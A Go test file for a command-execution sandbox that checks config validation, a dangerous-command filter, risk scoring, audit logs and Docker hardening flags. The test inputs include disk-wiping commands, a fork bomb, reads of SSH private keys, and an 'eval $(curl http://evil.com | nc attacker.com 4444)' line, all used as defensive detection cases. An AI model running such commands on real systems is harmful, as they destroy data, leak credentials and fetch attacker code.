package sandbox

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestValidateConfig(t *testing.T) {
	tests := []struct {
		name    string
		cfg     *SandboxConfig
		wantErr bool
		errType error
	}{
		{
			name:    "nil config",
			cfg:     nil,
			wantErr: true,
			errType: ErrConfigInvalid,
		},
		{
			name: "valid config",
			cfg: &SandboxConfig{
				MaxMemoryMB:    512,
				MaxCPU:         2,
				TimeoutSeconds: 60,
				Mode:           "local",
			},
			wantErr: false,
		},
		{
			name: "negative timeout",
			cfg: &SandboxConfig{
				TimeoutSeconds: -1,
			},
			wantErr: true,
			errType: ErrConfigInvalid,
		},
		{
			name: "negative memory",
			cfg: &SandboxConfig{
				MaxMemoryMB: -100,
			},
			wantErr: true,
			errType: ErrConfigInvalid,
		},
		{
			name: "overlapping read-only and deny paths",
			cfg: &SandboxConfig{
				ReadOnlyPaths: []string{"/tmp"},
				DenyPaths:     []string{"/tmp"},
			},
			wantErr: true,
			errType: ErrConfigInvalid,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateConfig(tt.cfg)
			if tt.wantErr {
				assert.Error(t, err)
				if tt.errType != nil {
					assert.True(t, errors.Is(err, tt.errType))
				}
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestCheckCommandSafetyDangerous(t *testing.T) {
	dangerous := []string{
		"rm -rf /",
		"rm -rf /*",
		"mkfs.ext4 /dev/sda",
		"dd if=/dev/zero of=/dev/sdb",
		":(){ :|:& };:", // fork bomb with function definition
		":()",            // fork bomb shorthand
	}

	for _, cmd := range dangerous {
		err := checkCommandSafety(cmd)
		assert.Error(t, err, "command %q should be flagged as dangerous", cmd)
		assert.True(t, errors.Is(err, ErrDangerousPath), "should be ErrDangerousPath for: %s", cmd)
	}
}

func TestCheckCommandSafetyDeniedPaths(t *testing.T) {
	denied := []string{
		"cat /.ssh/authorized_keys",
		"cat /root/.ssh/id_rsa",
		"ls /sys/kernel/security",
		"cat /proc/sys/kernel/unprivileged_userns_clone",
	}

	for _, cmd := range denied {
		err := checkCommandSafety(cmd)
		assert.Error(t, err, "command %q should be flagged for denied path", cmd)
		assert.True(t, errors.Is(err, ErrDangerousPath), "should be ErrDangerousPath for: %s", cmd)
	}
}

func TestCheckCommandSafetyAllowed(t *testing.T) {
	safe := []string{
		"echo 'hello world'",
		"ls -la /tmp",
		"cat /etc/hostname",
		"ps aux",
		"df -h",
		"uptime",
		"whoami",
		"pwd",
		"touch /tmp/myfile",
		"cat /etc/shadow", // reading /etc/shadow is allowed by the pattern
	}

	for _, cmd := range safe {
		err := checkCommandSafety(cmd)
		assert.NoError(t, err, "command %q should be allowed", cmd)
	}
}

func TestLocalExecutorExecuteSimpleCommand(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-001",
	}

	result, err := exec.Execute(ctx, "echo 'hello from sandbox'", cfg)

	require.NoError(t, err)
	assert.Equal(t, 0, result.ExitCode)
	assert.Contains(t, result.Output, "hello from sandbox")
	assert.Greater(t, result.Duration, time.Duration(0))
}

func TestLocalExecutorExecuteWithTimeout(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 1,
		TraceID:        "test-timeout",
	}

	result, err := exec.Execute(ctx, "sleep 10 && echo done", cfg)

	// The timeout should cause an error or non-zero exit
	assert.True(t, result.ExitCode != 0 || err != nil)
}

func TestLocalExecutorExitCode(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-exitcode",
	}

	result, err := exec.Execute(ctx, "exit 42", cfg)

	assert.Equal(t, 42, result.ExitCode)
	assert.NoError(t, err)
}

func TestLocalExecutorDangerousCommand(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-dangerous",
	}

	result, err := exec.Execute(ctx, "rm -rf /", cfg)

	assert.Error(t, err)
	assert.True(t, errors.Is(err, ErrDangerousPath))
	assert.Equal(t, 100, result.RiskScore)
}

func TestLocalExecutorRiskScoring(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		cmd     string
		minRisk int
		maxRisk int
	}{
		{"echo", "echo 'hello'", 10, 20},
		{"curl", "curl example.com", 20, 40},
		{"netcat", "nc -l 8080", 25, 50},
		{"bash eval", "eval 'echo test'", 30, 60},
		{"pipe", "cat file | grep pattern", 15, 30},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewLocalExecutor()
			ctx := context.Background()
			cfg := SandboxConfig{
				TimeoutSeconds: 5,
				TraceID:        "test-risk",
			}

			result, err := exec.Execute(ctx, tt.cmd, cfg)
			require.NoError(t, err)
			assert.GreaterOrEqual(t, result.RiskScore, tt.minRisk)
			assert.LessOrEqual(t, result.RiskScore, tt.maxRisk)
		})
	}
}

func TestLocalExecutorAuditLog(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	auditFile := filepath.Join(tmpDir, "audit.log")

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:       "test-audit",
		AuditLogPath:  auditFile,
	}

	_, err := exec.Execute(ctx, "echo test", cfg)
	require.NoError(t, err)

	data, err := os.ReadFile(auditFile)
	require.NoError(t, err)
	assert.Contains(t, string(data), `"trace_id":"test-audit"`)
	assert.Contains(t, string(data), `"mode":"local"`)
	assert.Contains(t, string(data), `"command":"echo test"`)
}

func TestLocalExecutorContextCancellation(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	cfg := SandboxConfig{
		TimeoutSeconds: 10,
		TraceID:        "test-cancel",
	}

	result, err := exec.Execute(ctx, "echo 'should not run'", cfg)

	assert.Error(t, err)
	assert.Equal(t, 1, result.ExitCode)
}

func TestLocalExecutorPipeline(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-pipeline",
	}

	result, err := exec.Execute(ctx, "echo 'line1\nline2\nline3' | grep line2", cfg)

	require.NoError(t, err)
	assert.Equal(t, 0, result.ExitCode)
	assert.Contains(t, result.Output, "line2")
}

func TestLocalExecutorStderrCapture(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-stderr",
	}

	result, err := exec.Execute(ctx, "echo 'error output' >&2", cfg)

	assert.NoError(t, err)
	assert.Contains(t, result.Output, "error output")
}

func TestDockerExecutorNotFound(t *testing.T) {
	t.Parallel()

	exec := NewDockerExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-docker",
		DockerImage:    "alpine:latest",
	}

	// Test with a non-existent docker image path that will fail
	cfg.DockerImage = "nonexistent-image-12345:99999"
	result, err := exec.Execute(ctx, "echo test", cfg)

	// Should either fail to find docker or fail to pull image
	// Either way, we verify the execution path was attempted
	assert.True(t, result.ExitCode != 0 || err != nil)
}

func TestSSHExecutorNoTarget(t *testing.T) {
	t.Parallel()

	exec := &SSHExecutor{User: "test", KeyPath: ""}
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-ssh",
		SSHTarget:      "", // Empty target
	}

	result, err := exec.Execute(ctx, "echo test", cfg)

	assert.Error(t, err)
	assert.True(t, errors.Is(err, ErrConfigInvalid))
	assert.Equal(t, 100, result.RiskScore)
}

func TestDefaultSandboxConfig(t *testing.T) {
	cfg := DefaultSandboxConfig()

	assert.Equal(t, int64(512), cfg.MaxMemoryMB)
	assert.Equal(t, 2, cfg.MaxCPU)
	assert.Equal(t, 60, cfg.TimeoutSeconds)
	assert.Contains(t, cfg.ReadOnlyPaths, "/tmp")
	assert.Contains(t, cfg.DenyPaths, "/etc/shadow")
	assert.Equal(t, "local", cfg.Mode)
}

func TestParseConfig(t *testing.T) {
	tests := []struct {
		name    string
		json    string
		wantErr bool
		check   func(*testing.T, *SandboxConfig)
	}{
		{
			name: "valid config",
			json: `{
				"MaxMemoryMB": 1024,
				"MaxCPU": 4,
				"TimeoutSeconds": 120,
				"Mode": "docker",
				"DockerImage": "alpine:latest",
				"TraceID": "test-123"
			}`,
			wantErr: false,
			check: func(t *testing.T, cfg *SandboxConfig) {
				assert.Equal(t, int64(1024), cfg.MaxMemoryMB)
				assert.Equal(t, 4, cfg.MaxCPU)
				assert.Equal(t, 120, cfg.TimeoutSeconds)
				assert.Equal(t, "docker", cfg.Mode)
				assert.Equal(t, "alpine:latest", cfg.DockerImage)
				assert.Equal(t, "test-123", cfg.TraceID)
			},
		},
		{
			name:    "invalid json",
			json:    `{invalid}`,
			wantErr: true,
		},
		{
			name: "empty allowed hosts",
			json: `{
				"AllowedHosts": [],
				"AllowedPorts": [80, 443]
			}`,
			wantErr: false,
			check: func(t *testing.T, cfg *SandboxConfig) {
				assert.Empty(t, cfg.AllowedHosts)
				assert.Equal(t, []int{80, 443}, cfg.AllowedPorts)
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg, err := ParseConfig(tt.json)
			if tt.wantErr {
				assert.Error(t, err)
				return
			}
			require.NoError(t, err)
			if tt.check != nil {
				tt.check(t, cfg)
			}
		})
	}
}

func TestSSHExecutorRiskScoring(t *testing.T) {
	t.Parallel()

	// SSH mode should increase risk score
	cfg := SandboxConfig{
		TimeoutSeconds: 60,
		Mode:           "ssh",
	}

	score := assessRisk("echo hello", cfg, nil)
	assert.Greater(t, score, 10, "SSH mode should increase risk score")
}

func TestDockerBuildArgs(t *testing.T) {
	exec := NewDockerExecutor()

	cfg := SandboxConfig{
		MaxMemoryMB:  1024,
		MaxCPU:       2,
		DockerImage:  "my-image:latest",
		ReadOnlyPaths: []string{"/data"},
		DenyPaths:    []string{"/secret"},
	}

	args := exec.buildDockerArgs("echo test", cfg)

	assert.Contains(t, args, "run")
	assert.Contains(t, args, "--rm")
	assert.Contains(t, args, "--network=none")
	assert.Contains(t, args, "--memory")
	assert.Contains(t, args, "1024m")
	assert.Contains(t, args, "--cpus")
	assert.Contains(t, args, "2")
	assert.Contains(t, args, "--read-only")
	assert.Contains(t, args, "--user")
	assert.Contains(t, args, "65534:65534")
	assert.Contains(t, args, "--cap-drop=ALL")
	assert.Contains(t, args, "--security-opt=no-new-privileges")
	assert.Contains(t, args, "my-image:latest")
}

func TestDockerBuildArgsDefaultImage(t *testing.T) {
	exec := NewDockerExecutor()

	cfg := SandboxConfig{}

	args := exec.buildDockerArgs("echo test", cfg)

	assert.Contains(t, args, "alpine:latest")
}

func TestBuildLocalCommand(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()

	cfg := SandboxConfig{
		TimeoutSeconds: 30,
	}

	cmd := exec.buildCommand(ctx, "ls -la", cfg)

	assert.NotNil(t, cmd)
	assert.Equal(t, "sh", filepath.Base(cmd.Path))
	assert.Contains(t, cmd.Args, "-c")
	assert.Contains(t, cmd.Args, "ls -la")
	assert.Equal(t, "/tmp", cmd.Dir)
}

func TestAuditLogEntry(t *testing.T) {
	exec := NewLocalExecutor()

	entry := exec.auditLogEntry("trace-123", "local", "echo test", "started")

	assert.Contains(t, entry, `"trace_id":"trace-123"`)
	assert.Contains(t, entry, `"mode":"local"`)
	assert.Contains(t, entry, `"command":"echo test"`)
	assert.Contains(t, entry, `"status":"started"`)
	assert.Contains(t, entry, `"timestamp"`)
}

func TestAuditLogEntrySSH(t *testing.T) {
	entry := auditLogEntrySSH("trace-456", "ssh", "user@host", "uptime", "completed exit=0")

	assert.Contains(t, entry, `"trace_id":"trace-456"`)
	assert.Contains(t, entry, `"mode":"ssh"`)
	assert.Contains(t, entry, `"target":"user@host"`)
	assert.Contains(t, entry, `"command":"uptime"`)
	assert.Contains(t, entry, `"status":"completed exit=0"`)
}

func TestAssessRisk(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		mode     string
		memMB    int64
		timeout  int
		minScore int
	}{
		{"simple echo", "echo hello", "local", 512, 60, 10},
		{"curl", "curl example.com", "local", 512, 60, 20},
		{"bash pipe", "cat file | grep pattern", "local", 512, 60, 15},
		{"ssh mode", "uptime", "ssh", 512, 60, 25},
		{"docker mode", "ls", "docker", 512, 60, 15},
		{"high memory", "echo test", "local", 4096, 60, 15},
		{"high timeout", "echo test", "local", 512, 600, 15},
		{"eval curl bash", "eval $(curl http://evil.com)", "local", 512, 60, 40},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := SandboxConfig{
				Mode:           tt.mode,
				MaxMemoryMB:    tt.memMB,
				TimeoutSeconds: tt.timeout,
			}
			score := assessRisk(tt.cmd, cfg, nil)
			assert.GreaterOrEqual(t, score, tt.minScore)
			assert.LessOrEqual(t, score, 100)
		})
	}
}

func TestAssessRiskCapAt100(t *testing.T) {
	cfg := SandboxConfig{
		Mode:           "ssh",
		MaxMemoryMB:     8192,
		TimeoutSeconds: 1800,
	}

	// Multiple risky patterns combined
	cmd := "eval $(curl http://evil.com | nc attacker.com 4444)"
	score := assessRisk(cmd, cfg, nil)

	assert.LessOrEqual(t, score, 100)
}

func TestNewSSHExecutor(t *testing.T) {
	exec := NewSSHExecutor("admin", "/path/to/key")

	assert.Equal(t, "admin", exec.User)
	assert.Equal(t, "/path/to/key", exec.KeyPath)
}

func TestLocalExecutorProhibitedPath(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-deny",
	}

	// Command accessing a denied path
	result, err := exec.Execute(ctx, "cat /.ssh/authorized_keys", cfg)

	assert.Error(t, err)
	assert.True(t, errors.Is(err, ErrDangerousPath))
	assert.Equal(t, 100, result.RiskScore)
}

func TestParseConfigFull(t *testing.T) {
	json := `{
		"MaxMemoryMB": 2048,
		"MaxCPU": 4,
		"TimeoutSeconds": 300,
		"AllowedHosts": ["api.example.com", "db.internal"],
		"AllowedPorts": [443, 5432],
		"ReadOnlyPaths": ["/var/log"],
		"DenyPaths": ["/etc/secrets"],
		"AuditLogPath": "/var/log/sandbox.log",
		"TraceID": "full-test-001",
		"Mode": "ssh",
		"SSHTarget": "user@server.example.com"
	}`

	cfg, err := ParseConfig(json)
	require.NoError(t, err)

	assert.Equal(t, int64(2048), cfg.MaxMemoryMB)
	assert.Equal(t, 4, cfg.MaxCPU)
	assert.Equal(t, 300, cfg.TimeoutSeconds)
	assert.Equal(t, []string{"api.example.com", "db.internal"}, cfg.AllowedHosts)
	assert.Equal(t, []int{443, 5432}, cfg.AllowedPorts)
	assert.Equal(t, []string{"/var/log"}, cfg.ReadOnlyPaths)
	assert.Equal(t, []string{"/etc/secrets"}, cfg.DenyPaths)
	assert.Equal(t, "/var/log/sandbox.log", cfg.AuditLogPath)
	assert.Equal(t, "full-test-001", cfg.TraceID)
	assert.Equal(t, "ssh", cfg.Mode)
	assert.Equal(t, "user@server.example.com", cfg.SSHTarget)
}

func TestCommandWithSemicolon(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-semicolon",
	}

	result, err := exec.Execute(ctx, "echo first; echo second", cfg)

	require.NoError(t, err)
	assert.Contains(t, result.Output, "first")
	assert.Contains(t, result.Output, "second")
}

func TestCommandWithVariables(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-vars",
	}

	result, err := exec.Execute(ctx, "export X=hello && echo $X", cfg)

	require.NoError(t, err)
	assert.Contains(t, result.Output, "hello")
}

func TestWriteAuditLogNoPath(t *testing.T) {
	// Should not panic when audit path is empty
	writeAuditLog("", `{"test": true}`)
}

func TestLocalExecutorLongRunningCommand(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 10,
		TraceID:        "test-long",
	}

	result, err := exec.Execute(ctx, "sleep 0.5 && echo done", cfg)

	require.NoError(t, err)
	assert.Equal(t, 0, result.ExitCode)
	assert.Contains(t, result.Output, "done")
	assert.Greater(t, result.Duration, 400*time.Millisecond)
}

func TestRiskScoreVariance(t *testing.T) {
	exec := NewLocalExecutor()

	// Same command should produce consistent risk scores
	cfg := SandboxConfig{
		TimeoutSeconds: 60,
		Mode:           "local",
	}

	scores := make([]int, 5)
	for i := 0; i < 5; i++ {
		cfg.TraceID = "test-" + string(rune('a'+i))
		result, err := exec.Execute(context.Background(), "curl -s https://example.com/api", cfg)
		require.NoError(t, err)
		scores[i] = result.RiskScore
	}

	// All scores should be identical for the same command
	for i := 1; i < len(scores); i++ {
		assert.Equal(t, scores[0], scores[i], "risk score should be deterministic")
	}
}

func TestLocalExecutorMultipleCommands(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-multi",
	}

	result, err := exec.Execute(ctx, "echo one && echo two || echo three", cfg)

	require.NoError(t, err)
	assert.Contains(t, result.Output, "one")
	assert.Contains(t, result.Output, "two")
	assert.NotContains(t, result.Output, "three")
}

func TestLocalExecutorDeniedPathDeep(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-deny-deep",
	}

	result, err := exec.Execute(ctx, "ls /root/.ssh/", cfg)

	assert.Error(t, err)
	assert.True(t, errors.Is(err, ErrDangerousPath))
	assert.Equal(t, 100, result.RiskScore)
}

func TestDockerAuditLogEntry(t *testing.T) {
	exec := NewDockerExecutor()

	entry := exec.dockerAuditLogEntry("trace-789", "echo test", "started")

	assert.Contains(t, entry, `"trace_id":"trace-789"`)
	assert.Contains(t, entry, `"mode":"docker"`)
	assert.Contains(t, entry, `"command":"echo test"`)
	assert.Contains(t, entry, `"status":"started"`)
}

func TestLocalExecutorEnvSanitized(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-env",
	}

	result, err := exec.Execute(ctx, "echo $HOME", cfg)

	require.NoError(t, err)
	// HOME should be set to /tmp in sandbox
	assert.NotContains(t, result.Output, "$HOME")
}

func TestParseConfigMinimal(t *testing.T) {
	cfg, err := ParseConfig(`{}`)
	require.NoError(t, err)
	assert.Equal(t, int64(0), cfg.MaxMemoryMB)
	assert.Equal(t, 0, cfg.MaxCPU)
	assert.Equal(t, 0, cfg.TimeoutSeconds)
	assert.Equal(t, "", cfg.Mode)
}

func TestBuildDockerArgsEmptyPaths(t *testing.T) {
	exec := NewDockerExecutor()

	cfg := SandboxConfig{
		DockerImage: "test:latest",
	}

	args := exec.buildDockerArgs("ls", cfg)

	// Should not contain tmpfs or volume flags when no paths specified
	assert.Contains(t, args, "test:latest")
}

func TestLocalExecutorWithEnv(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-withenv",
	}

	// Set a custom env var through the command
	result, err := exec.Execute(ctx, "TESTVAR=hello sh -c 'echo $TESTVAR'", cfg)

	require.NoError(t, err)
	assert.Contains(t, result.Output, "hello")
}

func TestValidateConfigZeroValue(t *testing.T) {
	// Zero value config should be valid (no negative values)
	err := ValidateConfig(&SandboxConfig{})
	assert.NoError(t, err)
}

func TestLocalExecutorDeniedSyscall(t *testing.T) {
	t.Parallel()

	exec := NewLocalExecutor()
	ctx := context.Background()
	cfg := SandboxConfig{
		TimeoutSeconds: 5,
		TraceID:        "test-sys",
		DenyPaths:      []string{"/sys/kernel/security"},
	}

	result, err := exec.Execute(ctx, "cat /sys/kernel/security/apparmor/profiles", cfg)

	assert.Error(t, err)
	assert.True(t, errors.Is(err, ErrDangerousPath))
	assert.Equal(t, 100, result.RiskScore)
}

func TestParseConfigPartial(t *testing.T) {
	cfg, err := ParseConfig(`{"Mode": "ssh", "SSHTarget": "user@host"}`)
	require.NoError(t, err)
	assert.Equal(t, "ssh", cfg.Mode)
	assert.Equal(t, "user@host", cfg.SSHTarget)
}

// BenchmarkAssessRisk benchmarks the risk assessment function.
func BenchmarkAssessRisk(b *testing.B) {
	cfg := SandboxConfig{
		Mode:           "local",
		MaxMemoryMB:    512,
		TimeoutSeconds: 60,
	}
	cmd := "curl -s https://example.com/api | grep -o 'data'"

	for i := 0; i < b.N; i++ {
		_ = assessRisk(cmd, cfg, nil)
	}
}

// BenchmarkCheckCommandSafety benchmarks the command safety check.
func BenchmarkCheckCommandSafety(b *testing.B) {
	cmd := "curl -s https://example.com/api | grep -o 'data'"

	for i := 0; i < b.N; i++ {
		_ = checkCommandSafety(cmd)
	}
}
